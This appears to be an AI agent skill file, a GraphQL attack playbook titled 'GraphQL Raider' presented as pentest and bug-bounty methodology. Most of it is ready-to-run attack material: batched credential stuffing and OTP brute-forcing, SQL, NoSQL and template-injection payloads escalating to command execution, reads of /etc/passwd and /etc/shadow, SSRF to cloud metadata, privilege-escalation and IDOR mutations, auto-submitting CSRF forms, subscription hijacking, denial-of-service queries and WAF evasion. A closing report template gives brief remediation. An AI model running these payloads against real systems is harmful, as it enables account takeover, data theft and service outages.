---
name: graphql-raider
description: Complete GraphQL security testing methodology — introspection abuse and schema enumeration, field suggestion oracle (when introspection is disabled), query depth/batching DoS, alias-based rate limit bypass, injection through arguments (SQL/NoSQL/SSTI), broken object-level and field-level authorization (IDOR via mutations), CSRF via GET mutations and content-type bypass, subscription hijacking via WebSocket, circular fragment DoS, and mass assignment via mutations. Trigger when the user finds a /graphql endpoint, sees GraphQL queries in traffic, wants to test a GraphQL API for vulnerabilities, needs to enumerate a hidden schema without introspection, wants to bypass rate limits or brute-force credentials through GraphQL, or needs to escalate privileges through mutations.
license: MIT
metadata:
  version: "1.0.0"
  author: Rifteo
  tags: ["graphql", "pentest", "api", "injection", "authorization", "dos", "idor", "bug-bounty", "web", "websocket"]
---

# GraphQL Raider

GraphQL replaces REST with a single flexible endpoint where clients define exactly what they want. That power collapses the usual defense lines: one endpoint holds every operation, the schema is self-documenting, and query structure is client-controlled — making it a uniquely attack-rich surface.

**Core GraphQL concepts you need:**
```
Query     → read data           (GET equivalent)
Mutation  → write/change data   (POST/PUT/DELETE equivalent)
Subscription → real-time stream (WebSocket)
Introspection → schema self-documentation (__schema, __type)
Fragment  → reusable query piece, can be recursive
Alias     → rename a field in the response, allows duplicating queries
Directive → @include(if: bool), @skip(if: bool), @deprecated
```

---

## Attack Index

| # | Attack | Impact |
|---|--------|--------|
| 1 | Introspection Abuse | Full schema dump, hidden fields/mutations |
| 2 | Field Suggestion Oracle | Schema recon when introspection is disabled |
| 3 | Query Depth Attack | DoS via infinitely nested queries |
| 4 | Batching Attack | Rate limit bypass, credential stuffing |
| 5 | Alias Overloading | Rate limit bypass per-request |
| 6 | Injection via Arguments | SQLi / NoSQLi / SSTI through query args |
| 7 | Broken Object-Level Auth | IDOR — access other users' data |
| 8 | Broken Field-Level Auth | Privilege escalation — read/write restricted fields |
| 9 | CSRF via GET Mutations | Trigger mutations from a victim's browser |
| 10 | Information Disclosure | Stack traces, internal types, verbose errors |
| 11 | Circular Fragment DoS | Recursive fragments crash parsers |
| 12 | Subscription Hijacking | WebSocket auth bypass, real-time data theft |
| 13 | Mass Assignment via Mutations | Send undocumented fields to elevate privileges |
| 14 | WAF / Protection Bypass | Encoding, whitespace, aliases to evade controls |

---

## Phase 1 — Reconnaissance: Find & Fingerprint GraphQL

### 1.1 Common Endpoint Paths

```
/graphql
/graphql/v1
/api/graphql
/v1/graphql
/v2/graphql
/query
/gql
/graph
/api/query
/graphiql          ← in-browser IDE, huge finding on its own
/playground        ← Apollo Sandbox / GraphQL Playground
/altair
/api/explorer
```

```bash
# Brute-force GraphQL endpoints
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/graphql-endpoints.txt \
  -H "Content-Type: application/json" -mc 200,400 -o endpoints.json

# Check for GraphiQL IDE (unauthenticated)
curl -s https://target.com/graphiql | grep -i "graphql\|playground\|altair"
```

### 1.2 Fingerprint the Server

Send a minimal introspection ping — the error message alone identifies the stack:

```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}' | python3 -m json.tool
```

| Response indicator | Server |
|---|---|
| `"data": {"__typename": "Query"}` | GraphQL working, introspection on |
| `"errors": [{"message": "introspection disabled"}]` | Hasura / Apollo with introspection off |
| `"errors": [{"message": "Must provide query string"}]` | express-graphql |
| `"errors": [{"extensions": {"code": "GRAPHQL_VALIDATION_FAILED"}}]` | Apollo Server |
| `200` with HTML body | GraphiQL IDE |

```bash
# Use graphw00f to auto-fingerprint (detects 30+ GraphQL engines)
pip install graphw00f
graphw00f -d -t https://target.com/graphql
```

### 1.3 Check Authentication Requirements

```bash
# Test unauthenticated access
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'

# Test with auth header
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"{ __typename }"}'
```

---

## Attack 1 — Introspection Abuse

**What:** GraphQL's built-in schema self-documentation exposes every type, field, argument, mutation, and subscription name — equivalent to reading the entire API spec.

### 1.1 Full Schema Dump

```graphql
query IntrospectionFull {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args { ...InputValue }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
    args { ...InputValue }
    type { ...TypeRef }
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name
  description
  defaultValue
  type { ...TypeRef }
}

fragment TypeRef on __Type {
  kind
  name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
}
```

```bash
# Save schema dump to file
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query":"{ __schema { types { name kind fields { name type { name kind } } } } }"}' \
  | python3 -m json.tool > schema_dump.json

# Use InQL (Burp extension) to generate attack surface from schema
# Or use graphql-voyager to visualize it
```

### 1.2 Enumerate Only Mutations (Highest Priority)

```graphql
query GetMutations {
  __type(name: "Mutation") {
    fields {
      name
      description
      args {
        name
        type { name kind ofType { name kind } }
      }
    }
  }
}
```

### 1.3 Enumerate All Queries

```graphql
query GetQueries {
  __type(name: "Query") {
    fields {
      name
      description
      args {
        name
        type { name kind ofType { name kind } }
      }
    }
  }
}
```

### 1.4 Hunt Deprecated / Hidden Fields

Deprecated fields are often forgotten but still functional:

```graphql
query HiddenFields {
  __schema {
    types {
      name
      fields(includeDeprecated: true) {
        name
        isDeprecated
        deprecationReason
      }
    }
  }
}
```

**Look for:** `admin`, `password`, `token`, `secret`, `internal`, `debug`, `raw`, `legacy`, `private`, `bypass`

---

## Attack 2 — Field Suggestion Oracle (Introspection Disabled)

**What:** Most GraphQL implementations return helpful "Did you mean X?" suggestions even when introspection is disabled. By fuzzing field names and reading the error, you can reconstruct the schema.

### 2.1 Manual Probing

```bash
# Send a typo — server suggests the real field name
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usr { id } }"}'
# → "Cannot query field \"usr\". Did you mean \"user\" or \"users\"?"

curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { passwrd } }"}'
# → "Cannot query field \"passwrd\". Did you mean \"password\" or \"passwordHash\"?"
```

### 2.2 Automated Enumeration with Clairvoyance

```bash
# Clairvoyance reconstructs schema from field suggestions
pip install clairvoyance
clairvoyance -u https://target.com/graphql \
  -H "Authorization: Bearer TOKEN" \
  -w /usr/share/wordlists/graphql-fields.txt \
  -o schema_recovered.json

# Then generate attack queries from recovered schema
python3 -c "
import json
schema = json.load(open('schema_recovered.json'))
for t in schema.get('types', []):
    if t.get('fields'):
        print(t['name'], [f['name'] for f in t['fields']])
"
```

### 2.3 Wordlist for Field Fuzzing

High-value field names to probe for:
```
id, userId, adminId, role, isAdmin, isSuperAdmin, permissions, token, apiKey,
password, passwordHash, secret, internalNote, adminNote, rawData, debugInfo,
creditCard, ssn, email, phone, address, dob, resetToken, verifyToken,
twoFactorSecret, backupCode, sessionToken, accessToken, refreshToken
```

---

## Attack 3 — Query Depth Attack (DoS)

**What:** GraphQL allows arbitrarily nested queries. Without a depth limit, a single request can force exponential server-side resolution work.

### 3.1 Detect Maximum Depth

Start shallow, increase until server errors or slows:

```bash
# Depth 5
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { friends { friends { friends { friends { id } } } } } }"}'

# Depth 10+ — server should reject or slow
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ a: user { b: friends { c: friends { d: friends { e: friends { f: friends { g: friends { h: friends { i: friends { j: friends { id } } } } } } } } } } }"}'
```

### 3.2 Exponential Query (Maximum Blast)

```graphql
# N-level nesting — every level multiplies the work
{
  user {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    id name email
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Evidence:** measure response time at depth 3, 5, 8, 12. Linear vs exponential growth confirms no depth limit.

### 3.3 Introspection Depth Bomb

```graphql
{
  __type(name: "Query") {
    fields {
      type {
        fields {
          type {
            fields {
              type {
                fields {
                  type { name }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

---

## Attack 4 — Batching Attacks (Rate Limit Bypass)

**What:** GraphQL supports sending multiple operations in one HTTP request as a JSON array. Most rate limiters count HTTP requests, not operations — so 100 operations in 1 request costs only 1 rate limit token.

### 4.1 Confirm Batching is Enabled

```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ __typename }"},{"query":"{ __typename }"}]'
# If response is an array → batching enabled
```

### 4.2 Credential Stuffing via Batching

```python
# 100 login attempts in 1 HTTP request
import json

batch = [
    {
        "query": """
        mutation Login($email: String!, $password: String!) {
          login(email: $email, password: $password) {
            token
            user { id role }
          }
        }
        """,
        "variables": {"email": f"user{i}@target.com", "password": "Password123!"}
    }
    for i in range(100)
]

print(json.dumps(batch, indent=2))
```

```bash
python3 scripts/graphql_raider.py --url https://target.com/graphql \
  --mode batch-bruteforce \
  --email-list emails.txt \
  --password-list passwords.txt \
  --batch-size 50
```

### 4.3 OTP / 2FA Bypass via Batching

```python
batch = [
    {
        "query": "mutation { verifyOTP(code: \"%s\") { token } }" % str(i).zfill(6)
    }
    for i in range(10000)  # all OTP codes in 200 requests
]
```

### 4.4 Email Enumeration via Batching

```python
batch = [
    {"query": 'query { userByEmail(email: "%s") { id } }' % email}
    for email in open("emails.txt").read().splitlines()
]
```

---

## Attack 5 — Alias Overloading (Rate Limit Bypass)

**What:** GraphQL aliases let you run the same query multiple times in one request under different names. Unlike batching, this works even when batch mode is disabled — and is harder to detect.

### 5.1 Basic Alias Attack

```graphql
{
  a1: login(email: "user@target.com", password: "pass1") { token }
  a2: login(email: "user@target.com", password: "pass2") { token }
  a3: login(email: "user@target.com", password: "pass3") { token }
  a4: login(email: "user@target.com", password: "pass4") { token }
  a5: login(email: "user@target.com", password: "pass5") { token }
  # ... continue to 100+
}
```

### 5.2 Generate Alias Payload

```python
passwords = open("common-passwords.txt").read().splitlines()[:200]
aliases = "\n".join(
    f'  a{i}: login(email: "admin@target.com", password: "{p}") {{ token user {{ role }} }}'
    for i, p in enumerate(passwords)
)
query = "{\n" + aliases + "\n}"
print(query)
```

### 5.3 Alias + Introspection (enumeration at scale)

```graphql
{
  t1: __type(name: "User") { fields { name } }
  t2: __type(name: "Admin") { fields { name } }
  t3: __type(name: "Order") { fields { name } }
  t4: __type(name: "Payment") { fields { name } }
  t5: __type(name: "InternalUser") { fields { name } }
}
```

---

## Attack 6 — Injection via Arguments

GraphQL arguments pass directly to resolvers which often call databases or template engines.

### 6.1 SQL Injection

```graphql
# Classic SQLi in a string argument
{ user(id: "1 OR 1=1--") { id name email } }
{ user(id: "1' UNION SELECT username,password,3 FROM users--") { id name email } }
{ users(filter: "1=1; DROP TABLE users--") { id } }

# Time-based blind SQLi (MySQL)
{ user(id: "1 AND SLEEP(5)--") { id } }

# Time-based blind SQLi (PostgreSQL)
{ user(id: "1; SELECT pg_sleep(5)--") { id } }

# Boolean-based blind
{ user(email: "admin@target.com' AND '1'='1") { id } }
{ user(email: "admin@target.com' AND '1'='2") { id } }
```

```bash
# SQLMap through GraphQL
sqlmap -u "https://target.com/graphql" \
  --data='{"query":"{ user(id: \"*\") { id name } }"}' \
  --dbms=mysql \
  --level=5 --risk=3 \
  --headers="Authorization: Bearer TOKEN"
```

### 6.2 NoSQL Injection (MongoDB)

```graphql
# Operator injection
{ user(email: {$gt: ""}) { id name email password } }
{ users(filter: {role: {$ne: "user"}}) { id name role } }
{ login(email: "admin", password: {$gt: ""}) { token } }

# Regex injection
{ user(email: {$regex: ".*"}) { id email password } }
{ user(email: {$regex: "^admin"}) { id role } }

# JSON injection via string argument
{ user(filter: "{\"$where\":\"this.role=='admin'\"}") { id } }
```

### 6.3 SSTI (Server-Side Template Injection)

```graphql
# Test if arguments are rendered through a template engine
{ report(template: "{{7*7}}") { content } }
{ report(template: "${7*7}") { content } }
{ report(template: "<%= 7*7 %>") { content } }

# RCE escalation (if Jinja2 / Twig / Freemarker)
{ report(template: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}") { content } }
{ report(template: "${T(java.lang.Runtime).getRuntime().exec('id')}") { content } }
```

### 6.4 Path Traversal via File Arguments

```graphql
{ readFile(path: "../../../../etc/passwd") { content } }
{ exportReport(filename: "../../../etc/shadow") { url } }
{ loadTemplate(name: "../../config/database.yml") { content } }
```

### 6.5 SSRF via URL Arguments

```graphql
{ fetchUrl(url: "http://169.254.169.254/latest/meta-data/") { response } }
{ generatePDF(url: "http://internal-service:8080/admin") { file } }
{ importData(source: "file:///etc/passwd") { rows } }
```

---

## Attack 7 — Broken Object-Level Authorization (IDOR)

**What:** GraphQL resolvers that take an `id` argument may not verify the requesting user owns that resource. Change the ID to access other users' data.

### 7.1 IDOR in Queries

```graphql
# Authenticated as user 42 — try fetching user 1 (admin)
query {
  user(id: 1) {
    id
    email
    role
    isAdmin
    password
    apiKey
    creditCards { number expiry cvv }
  }
}

# Fetch all users (missing authorization check)
query {
  users { id email role isAdmin }
}

# Access another user's private data
query {
  order(id: 9999) {
    id
    userId
    items { name price }
    paymentMethod { last4 }
  }
}
```

### 7.2 IDOR in Mutations

```graphql
# Change another user's email
mutation {
  updateUser(id: 1, email: "attacker@evil.com") {
    id email
  }
}

# Delete another user's data
mutation {
  deletePost(id: 1337) { success }
}

# Transfer ownership to attacker account
mutation {
  transferOwnership(resourceId: 50, newOwnerId: 99) { success }
}
```

### 7.3 Enumerate IDs Systematically

```graphql
# Use aliases to check IDs in bulk
{
  u1: user(id: 1) { id email role }
  u2: user(id: 2) { id email role }
  u3: user(id: 3) { id email role }
  # ... up to 100 in one request
}
```

```bash
python3 scripts/graphql_raider.py --url https://target.com/graphql \
  --mode idor-scan \
  --token "Bearer YOUR_TOKEN" \
  --query "{ user(id: ID_PLACEHOLDER) { id email role isAdmin } }" \
  --id-range 1-500
```

### 7.4 UUID / Non-Sequential IDOR

```graphql
# UUIDs can be leaked via other queries — harvest from one endpoint, use in another
query {
  myPosts { id }          # leaks other UUIDs referenced in your posts
  comments { authorId }  # leaks other user UUIDs
}
```

---

## Attack 8 — Broken Field-Level Authorization (Privilege Escalation)

**What:** The server may expose admin-only or sensitive fields to regular users. The schema knows they exist — but authorization may not be enforced per-field.

### 8.1 Read Restricted Fields as Low-Privilege User

```graphql
# Try reading admin/privileged fields
query {
  me {
    id
    email
    role          # might return "admin" or "user"
    isAdmin       # boolean flag
    permissions   # array of allowed actions
    apiKey        # secret key
    twoFactorSecret
    passwordHash
    internalNotes
    auditLog { action timestamp }
    billingDetails { plan invoices { amount } }
  }
}

# Try reading other user's restricted fields
query {
  user(id: 5) {
    email
    passwordHash
    role
    isAdmin
    apiKey
    resetToken
  }
}
```

### 8.2 Escalate Role via Mutation

```graphql
# Try setting your own role to admin
mutation {
  updateMe(role: "admin") {
    id role isAdmin
  }
}

# Try updating role through undocumented field
mutation {
  updateUser(id: YOUR_ID, input: { role: "admin", isAdmin: true }) {
    id role isAdmin
  }
}

# Try bypassing field-level auth with alias
mutation {
  r: updateUser(id: YOUR_ID, role: "admin") { role }
}
```

### 8.3 Admin Query Exposure

```graphql
# Query mutation type to find admin-only mutations
query {
  __type(name: "Mutation") {
    fields {
      name
      args { name type { name } }
    }
  }
}

# Call admin mutations as regular user
mutation {
  adminDeleteUser(id: 1) { success }
  adminResetPassword(userId: 1, newPassword: "hacked") { success }
  grantAdminRole(userId: YOUR_ID) { success }
}
```

---

## Attack 9 — CSRF via GET Mutations

**What:** Some GraphQL servers allow mutations over GET requests. Combined with a missing CSRF token check, an attacker can trigger mutations by tricking a victim into clicking a link.

### 9.1 Test GET-Based Mutation

```bash
# Check if mutations work over GET (should be rejected but often aren't)
curl -s -G https://target.com/graphql \
  --data-urlencode 'query=mutation { deleteAccount(id: 5) { success } }'

# If 200 → Critical CSRF
```

### 9.2 Content-Type CSRF Bypass

```html
<!-- HTML form CSRF — browser sends application/x-www-form-urlencoded -->
<!-- Some GraphQL servers accept this instead of requiring application/json -->
<form method="POST" action="https://target.com/graphql">
  <input name="query" value='mutation { updateEmail(email: "attacker@evil.com") { success } }'>
  <input type="submit">
</form>

<!-- Auto-submit version (embed in iframe) -->
<form id="x" method="POST" action="https://target.com/graphql">
  <input name="query" value='mutation { transferFunds(to: "attacker", amount: 1000) { success } }'>
</form>
<script>document.getElementById('x').submit()</script>
```

### 9.3 multipart/form-data CSRF

```html
<form method="POST" action="https://target.com/graphql" enctype="multipart/form-data">
  <input name="operations" value='{"query":"mutation { deleteAccount { success } }"}'>
  <input name="map" value="{}">
</form>
```

### 9.4 Check CORS Misconfiguration + GraphQL

```bash
# If CORS is misconfigured, a cross-origin page can make credentialed POST requests
curl -s -X POST https://target.com/graphql \
  -H "Origin: https://attacker.com" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer VICTIM_TOKEN" \
  -d '{"query":"mutation { updateEmail(email: \"attacker@evil.com\") { success } }"}' \
  -v 2>&1 | grep -i "access-control"
```

---

## Attack 10 — Information Disclosure & Error Leakage

### 10.1 Force Verbose Errors

```graphql
# Trigger type mismatch errors — server often leaks internal details
{ user(id: "NOT_A_NUMBER") { id } }
{ user(id: null) { id } }
{ user(id: [1,2,3]) { id } }
{ user(id: {"$gt": 0}) { id } }

# Trigger resolver errors
{ user(id: 99999999) { nonExistentField } }
```

### 10.2 Stack Trace Extraction

Look for `extensions.exception.stacktrace` in errors:
```json
{
  "errors": [{
    "message": "Cannot read property 'id' of undefined",
    "extensions": {
      "code": "INTERNAL_SERVER_ERROR",
      "exception": {
        "stacktrace": [
          "TypeError: Cannot read property 'id' of undefined",
          "    at UserResolver.findUser (/app/src/resolvers/user.js:42:18)",
          "    at Object.<anonymous> (/app/node_modules/apollo-server/src/requestPipeline.js:..."
        ]
      }
    }
  }]
}
```

**What this leaks:** file paths, framework versions, internal variable names, database query structure.

### 10.3 Introspection When Disabled — Debug Endpoints

```bash
# Some engines have a debug/development endpoint
curl -s https://target.com/graphql-dev
curl -s https://target.com/graphql?debug=true
curl -s https://target.com/_graphql
curl -s https://target.com/graphql/schema    # may serve SDL schema file

# Apollo Sandbox (may be open externally)
curl -s https://studio.apollographql.com/sandbox -d "endpoint=https://target.com/graphql"
```

### 10.4 SDL Schema Exposure

```bash
curl -s https://target.com/graphql/schema.graphql
curl -s https://target.com/graphql/schema.json
curl -s https://target.com/schema.graphql
```

---

## Attack 11 — Circular Fragment DoS

**What:** GraphQL fragments can reference each other circularly. The spec requires servers to detect this, but some parsers crash or hang before the cycle check.

### 11.1 Basic Fragment Cycle

```graphql
fragment UserFields on User {
  friends {
    ...UserFields
  }
}

query {
  user(id: 1) {
    ...UserFields
  }
}
```

### 11.2 Indirect Cycle (Harder to Detect)

```graphql
fragment A on User {
  friends { ...B }
}

fragment B on User {
  followers { ...C }
}

fragment C on User {
  mutualFriends { ...A }
}

query {
  user(id: 1) { ...A }
}
```

### 11.3 Width + Depth Combined (Resource Exhaustion)

```graphql
query {
  u1: user(id:1) { ...F }
  u2: user(id:2) { ...F }
  u3: user(id:3) { ...F }
  # ... 50 aliases
}

fragment F on User {
  friends { friends { friends { friends { id email name } } } }
}
```

---

## Attack 12 — Subscription Hijacking (WebSocket)

**What:** GraphQL subscriptions run over WebSocket. Authentication is often only checked at the HTTP upgrade request, or not at all. Real-time data from other users may be accessible.

### 12.1 Connect to Subscription Endpoint

```javascript
// Browser DevTools console — connect to GraphQL subscription
const ws = new WebSocket('wss://target.com/graphql', 'graphql-ws');

ws.onopen = () => {
  // Handshake
  ws.send(JSON.stringify({ type: 'connection_init', payload: { Authorization: 'Bearer YOUR_TOKEN' } }));
};

ws.onmessage = (msg) => {
  const data = JSON.parse(msg.data);
  if (data.type === 'connection_ack') {
    // Subscribe to another user's events
    ws.send(JSON.stringify({
      id: '1',
      type: 'subscribe',
      payload: {
        query: `subscription { messageReceived(userId: 1) { id content sender { email } } }`
      }
    }));
  }
  console.log('Received:', JSON.stringify(data, null, 2));
};
```

### 12.2 Test Missing Authentication on Subscribe

```bash
# Connect without auth token — should be rejected
wscat -c wss://target.com/graphql \
  --subprotocol graphql-ws \
  -x '{"type":"connection_init","payload":{}}'

# Then subscribe without valid auth:
-x '{"id":"1","type":"subscribe","payload":{"query":"subscription { allUserMessages { id content user { email } } }"}}'
```

### 12.3 IDOR via Subscription

```graphql
# Subscribe to another user's notifications, orders, messages
subscription {
  orderUpdated(userId: 1) {
    id status paymentMethod { last4 }
  }
}

subscription {
  messageReceived(channelId: 999) {
    content author { email role }
  }
}
```

---

## Attack 13 — Mass Assignment via Mutations

**What:** Mutations accept an `input` object. If the resolver blindly maps all provided fields to a database update, attackers can set fields never intended to be user-controlled (role, isAdmin, credit).

### 13.1 Add Undocumented Fields to Input

```graphql
mutation {
  updateProfile(input: {
    name: "Alice"
    bio: "normal user"
    role: "admin"          # undocumented — try it anyway
    isAdmin: true          # boolean escalation
    credits: 999999        # free credits
    emailVerified: true    # skip email verification
    subscription: "enterprise"
  }) {
    id role isAdmin credits subscription
  }
}
```

### 13.2 Type Coercion Tricks

```graphql
# Integer field accepting string
mutation {
  updateUser(id: 1, credits: "99999") { credits }
}

# Null injection
mutation {
  updateUser(id: 1, passwordHash: null) { id }
}

# Array injection
mutation {
  updateUser(id: 1, roles: ["user", "admin"]) { roles }
}
```

### 13.3 Nested Object Mass Assignment

```graphql
mutation {
  createOrder(input: {
    items: [{ productId: 1, quantity: 1 }]
    payment: {
      method: "card"
      amount: 0.00    # override actual price
      currency: "USD"
    }
    user: {
      id: 1            # impersonate another user
    }
  }) {
    id total status
  }
}
```

---

## Attack 14 — WAF / Protection Bypass

### 14.1 Encoding Techniques

```bash
# URL-encode the entire query body
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'query={ user(id: 1) { email role } }'

# Unicode escaping in string arguments
{ user(id: "1") { id } }

# Inline fragment to avoid keyword detection
{ ... on Query { user(id: 1) { role } } }
```

### 14.2 Whitespace / Newline Obfuscation

```graphql
# Line breaks in unexpected places
{
  user(id:
    1
  ) {
    email
    role
  }
}

# Zero-width spaces (Unicode) in field names
{ ​user​ { ​id​ } }
```

### 14.3 Alias Obfuscation

```graphql
# Hide sensitive mutations behind innocent-looking aliases
{
  getData: deleteAccount(id: 1) { success }
  fetchInfo: grantAdmin(userId: 99) { role }
}
```

### 14.4 Fragment Obfuscation

```graphql
fragment d on User { role isAdmin apiKey }
fragment c on User { ...d email }
fragment b on User { ...c id }

query { me { ...b } }
```

### 14.5 POST → GET Conversion (Bypass POST-only WAF Rules)

```bash
# Some WAFs only inspect POST body — GET passes through
curl -G https://target.com/graphql \
  --data-urlencode 'query={ user(id: 1) { role passwordHash } }'
```

---

## Quick Recon Checklist

```bash
# 1. Detect GraphQL & fingerprint engine
graphw00f -d -t https://target.com/graphql

# 2. Dump schema (introspection on)
python3 scripts/graphql_raider.py --url https://target.com/graphql \
  --token "Bearer TOKEN" --mode introspect -o schema.json

# 3. Field suggestion recon (introspection off)
clairvoyance -u https://target.com/graphql \
  -H "Authorization: Bearer TOKEN" \
  -w /wordlists/graphql-fields.txt -o recovered.json

# 4. Check batching
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ __typename }"},{"query":"{ __typename }"}]' | head -5

# 5. Test GET mutations (CSRF)
curl -sG https://target.com/graphql \
  --data-urlencode 'query=mutation { __typename }'

# 6. Check GraphiQL IDE (unauthenticated)
curl -s https://target.com/graphiql | grep -i "graphql\|introspection"

# 7. Depth limit test
python3 scripts/graphql_raider.py --url https://target.com/graphql \
  --mode depth-test --token "Bearer TOKEN"

# 8. IDOR scan across IDs
python3 scripts/graphql_raider.py --url https://target.com/graphql \
  --mode idor-scan --token "Bearer TOKEN" \
  --query '{ user(id: ID_PLACEHOLDER) { id email role isAdmin } }' \
  --id-range 1-200
```

---

## Report Structure

```
Title: [GraphQL Attack Type] on [endpoint] — [impact]

Severity: [Critical / High / Medium / Low]

Affected endpoint: POST https://target.com/graphql

Vulnerability: [e.g., "Missing depth limit allows unauthenticated DoS" /
"Introspection enabled leaks full schema including admin mutations" /
"IDOR in user() query — regular user reads any user's passwordHash"]

Steps to reproduce:
1. Send the following GraphQL request:
   [EXACT HTTP REQUEST — headers + body]
2. Observe response: [EXACT RELEVANT PORTION OF RESPONSE]
3. Confirm: [what the response proves]

Impact:
- [Concrete consequence: "Attacker can read any user's password hash" /
  "50 login attempts per HTTP request bypasses rate limiting" /
  "Any authenticated user can elevate role to admin in one mutation"]

Evidence:
- Request: [HTTP request]
- Response: [redacted response proving the finding]

Remediation:
- [Per finding — see individual attack sections above]
- Disable introspection in production
- Implement query depth limiting (max 5-7 levels)
- Disable query batching or enforce per-operation rate limiting
- Validate authorization on every resolver, not just the route
- Reject GET-based mutations; require Content-Type: application/json
- Suppress stack traces and verbose errors in production
```

---

## Scripts

### `scripts/graphql_raider.py`
Requires: `pip3 install requests websockets`

```bash
# Introspection dump
python3 scripts/graphql_raider.py --url https://target.com/graphql \
  --token "Bearer eyJ..." \
  --mode introspect \
  -o schema.json

# IDOR scan across user IDs
python3 scripts/graphql_raider.py --url https://target.com/graphql \
  --token "Bearer eyJ..." \
  --mode idor-scan \
  --query '{ user(id: ID_PLACEHOLDER) { id email role isAdmin } }' \
  --id-range 1-500 \
  -o idor_findings.json

# Batch brute-force login
python3 scripts/graphql_raider.py --url https://target.com/graphql \
  --mode batch-bruteforce \
  --email admin@target.com \
  --password-list /wordlists/top1000.txt \
  --batch-size 50

# Depth DoS test
python3 scripts/graphql_raider.py --url https://target.com/graphql \
  --token "Bearer eyJ..." \
  --mode depth-test \
  --query-field "user { friends" \
  --max-depth 20

# Full automated scan
python3 scripts/graphql_raider.py --url https://target.com/graphql \
  --token "Bearer eyJ..." \
  --mode full \
  -o report.json
```

---

## Reference Files

- `references/graphql-payloads.md` — injection, IDOR, batching, and depth payloads ready to copy
- `references/tools.md` — InQL, graphw00f, clairvoyance, Altair, graphql-cop usage
